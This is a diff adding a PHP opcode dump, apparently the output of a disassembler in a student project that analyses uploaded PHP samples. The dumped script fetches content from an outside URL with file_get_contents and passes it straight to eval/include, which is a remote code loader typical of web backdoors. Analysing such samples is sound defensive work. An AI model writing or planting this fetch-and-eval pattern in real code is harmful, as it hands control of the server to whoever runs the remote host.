@@ -1,0 +1,9 @@
+function name: (null)
+L1-5 {main}() /Users/jiwon/Library/Mobile Documents/com~apple~CloudDocs/졸업과제/backend/outputs/0b31bfb4735733b9360b996571e0b937.php - 0x105882100 + 6 ops
+ L3    #0     INIT_FCALL<1>           96                   "file_get_contents"                      
+ L3    #1     SEND_VAL                "http://sb.f4ck.or"+ 1                                        
+ L3    #2     DO_ICALL                                                          @0                  
+ L3    #3     ASSIGN                  $b                   @0                                       
+ L4    #4     INCLUDE_OR_EVAL<1>      $b                                                            
+ L5    #5     RETURN<-1>              1                                                             
+[0;32m[Script ended normally][0m
